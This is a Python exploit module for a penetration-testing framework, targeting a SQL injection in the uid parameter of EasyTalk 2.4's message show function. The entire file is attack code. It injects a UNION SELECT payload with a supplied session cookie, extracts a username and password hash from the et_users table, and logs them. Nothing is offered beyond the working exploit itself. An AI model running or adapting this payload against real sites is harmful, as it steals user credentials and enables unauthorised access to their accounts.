#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger

author = "Chu <root@sh3ll.me>"
title = 'EasyTalk -2.4 uid SQLi'
description = "EasyTalk -2.4, MessageAction.class.php 中 show 函数 uid 参数未过滤导致 SQL 注入"
reference = "http://www.wooyun.org/bugs/wooyun-2010-050338"
options = {
    'target':'http://www.xxoo.com',
    'cookie':'xxx',
    # 登陆名
    'username':'admin',
}


def exploit(options):
    url = options['target']['current_value']
    logger.process("Requesting "+url)
    url = url + "/?m=message&a=show&uid=%27)%20union%20select%20concat(0x686" \
                "16e64736f6d65636875,user_name,0x7e7e7e,password,0x68616e647" \
                "36f6d65636875)%20from%20et_users%20limit%201,1%23"
    # 设置cookie
    header = {
        'Cookie':options['cookie']['current_value']
    }

    response = http.get(url, header, 5)

    if "handsomechu" in response.text:
        logger.success("Exploitable!")
        user = response.text.split("handsomechu")[1].split("~~~")
        username, password = user
        logger.success("Username: %s" % username)
        logger.success("Hash: %s" % password)
        return "%s: %s|%s" % (url, username, password)

